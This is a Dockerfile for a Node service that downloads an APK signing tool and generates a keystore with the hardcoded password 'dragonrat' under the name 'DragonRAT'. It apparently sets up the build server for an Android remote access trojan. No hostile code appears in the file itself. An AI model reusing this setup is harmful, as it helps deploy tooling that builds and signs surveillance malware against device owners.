# Stage 1: Build TypeScript
FROM node:22-slim AS build

WORKDIR /app
COPY package.json tsconfig.json ./
RUN npm install --no-audit --no-fund
COPY src/ ./src/
RUN npm run build

# Stage 2: Production image
FROM node:22-slim

ENV NODE_ENV=production

RUN apt-get update && apt-get install -y --no-install-recommends \
        openjdk-17-jre-headless \
        wget \
        curl \
        tini \
    && rm -rf /var/lib/apt/lists/*

# Create app user
RUN groupadd --gid 1001 app \
    && useradd --system --uid 1001 --gid 1001 --create-home app

WORKDIR /app

# Copy built TypeScript
COPY --from=build /app/dist ./dist
COPY package.json ./

# Install production dependencies
RUN npm install --omit=dev --no-audit --no-fund

# Copy factory directory
COPY factory/ ./factory/

# ─── DOWNLOAD uber-apk-signer.jar ───
RUN mkdir -p /app/factory && \
    wget -q "https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar" \
    -O /app/factory/uber-apk-signer.jar && \
    echo "✅ uber-apk-signer.jar downloaded" || \
    echo "⚠️ Failed to download uber-apk-signer.jar"

# ─── GENERATE DEFAULT KEYSTORE ───
RUN mkdir -p /app/data && \
    keytool -genkey -v -keystore /app/data/dragon.keystore \
    -alias dragon -keyalg RSA -keysize 2048 -validity 10000 \
    -storepass dragonrat -keypass dragonrat \
    -dname "CN=DragonRAT, OU=Security, O=Dragon, L=Unknown, ST=Unknown, C=XX" \
    2>/dev/null; \
    echo "✅ Keystore generated"

# Copy entrypoint
COPY docker-entrypoint.sh /usr/local/bin/docker-entrypoint.sh

RUN mkdir -p /app/data /app/data/builds \
    && chown -R app:app /app \
    && chmod +x /usr/local/bin/docker-entrypoint.sh

EXPOSE 8000

ENTRYPOINT ["/usr/bin/tini", "--", "/usr/local/bin/docker-entrypoint.sh"]

HEALTHCHECK --interval=30s --timeout=10s --start-period=15s --retries=3 \
    CMD wget --spider -q http://localhost:8000/health || exit 1

CMD ["node", "dist/index.js"]
